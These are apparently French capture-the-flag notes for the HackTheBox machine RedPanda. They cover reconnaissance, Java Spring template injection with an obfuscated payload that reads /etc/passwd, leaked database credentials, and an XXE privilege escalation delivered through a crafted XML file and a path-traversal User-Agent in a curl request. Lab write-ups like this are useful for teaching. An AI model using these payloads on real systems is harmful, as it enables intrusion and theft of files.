\chapter{RedPanda}
\begin{itemize}
    \item {\bf level}: Easy

    \item {\bf keywords}: \gls{t:xxe} \gls{t:ssti} \gls{t:sudo-privesc}

    \item {\bf tools}: exiftool,
\href{https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection}{PayloadsAllTheThings
Templates Injections}, pspy
\end{itemize}


\subsection{Résumé}

\verb+nmap+ montre du \verb+ssh+ et du \verb+http+ en 8080.


sur le site web on a de la reflexion en premiere approche semble bien parsé.

on essaie un \verb+ffuf+ de param sur \verb+search?+ avec la wordlist
\verb+seclists/Discovery/Web-Content/burp-parameter-names.txt+

dans le code on lit :
\begin{verbatim}
https://codepen.io/khr2003/pen/BGZdXw
made with spring boot
\end{verbatim}


en tappant \verb+a+ on a du contenu.

qui donne une nouvelle url \verb+http://10.10.11.170:8080/stats?author=woodenk+

on a un export xml dans le xml on retrouve ne nom de l'auteur et les images.

il faut essayer une injection sur le nom de l'auteur.

\verb+${7*7}+ Error occured: banned characters
mais \verb+{{7*7}}+ ne gène pas

\verb+<%= 7/0 %>+ banned

tpkmap ne trouve pas.

avec
\href{https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md}{
PayloadsAllTheThings} on identifie que l'on a a faire à du java. On confirme
avec \verb+${T(java.lang.System).getenv()}+

\verb+*{T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}+ donne un
\verb+Process[pid=3453, exitValue=1]+

\verb+${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}+ donne un
\verb+Process[pid=3693, exitValue="not exited"]+

\begin{verbatim}
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
\end{verbatim}

bingo.
\begin{verbatim}
woodenk:x:1000:1000:,,,:/home/woodenk:/bin/bash mysql:x:113:118:MySQL Server
\end{verbatim}


\href{https://github.com/adeiarias/Java-SSTI-generator}{Java-SSTI-generator}

c'est parti pour la peche à la donnée
\begin{verbatim}
python java_ssti_generator.py --command 'ls /'
python java_ssti_generator.py --command 'whoami'
\end{verbatim}

paye ton flag mais pas de \verb+id_rsa+

on essaie un revers shell mais ca ne semble pas fonctionner.

on sait qu'il y a une bdd. on va donc chercher une connexion à la bdd dans le
site web.


\begin{verbatim}
/opt/panda_search/src/main/java/com/panda_search/htb/panda_search/MainController.java

mysql://localhost:3306/red_panda", "woodenk", "RedPandazRule"
\end{verbatim}


dans \verb+/opt+ il y a un script de \verb+root+ qui semble netoyer des jpg
dans \verb+/home/woodenk+ ca sent la cron privesc.

le script n'est pas exploitable. L'analyse du code de \verb+App.java+ montre
qu'il y a un process qui lit le contenu de
\verb+/opt/panda_search/redpanda.log+ et produit (met à jour) un fichier xml
des stats vues par auteur.

On test si ce fichier est vulnérable à une attaque \verb+XXE+ ce qui est le
cas.

pour cela il faut :
\begin{itemize}
    \item placer une image \verb+.jpg+ dans le repertoire \verb+/tmp+ qui
        contient un tag \verb+Artist+ qui va pointer vers le fichier xml qui
        contient l'attaque (\verb+../tmp/toto+). le nom de l'artiste est
        utilisé pour trouver le fichier de stat:
\begin{verbatim}
xmlPath = "/credits/" + artist + "_creds.xml";
\end{verbatim}
    \item un fichier xml (\verb+toto_creds.xml+) dans \verb+/tmp+.
\begin{verbatim}
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE evil [
      <!ENTITY payload "pwned">
]>
<credits>
  <author>woodenk</author>
  <image>
  	<disclose>&payload;</disclose>
    <uri>/../../../../../../tmp/pwn.jpg</uri>
    <views>0</views>
  </image>
   <totalviews>0</totalviews>
</credits>
\end{verbatim}

    \item produire une entrée dans \verb+/opt/panda_search/redpanda.log+ en
        effectuant une requete \verb+curl+ il faut utiliser l'agent pour
        produite un exploit une faille  de lecture car l'uri n'est pas directement
        exploitable. l'image se trouve dans 
        \verb-/opt/panda_search/src/main/resources/static + uri-:
\begin{verbatim}
curl http://10.10.11.170  -H “User-Agent: ||/../../../../../../tmp/pwn.jpg”
\end{verbatim}
\end{itemize}


n peut controler le passage du cron 
\verb+tail -f /opt/panda_search/redpanda.log+

une fois cela validé on peut utiliser différent payload:
\begin{itemize}
    \item directory listing (\verb+file:///etc/+) OK
    \item file exfiltration (\verb+file:///etc/passwd+) OK
\end{itemize}

DONE root flag

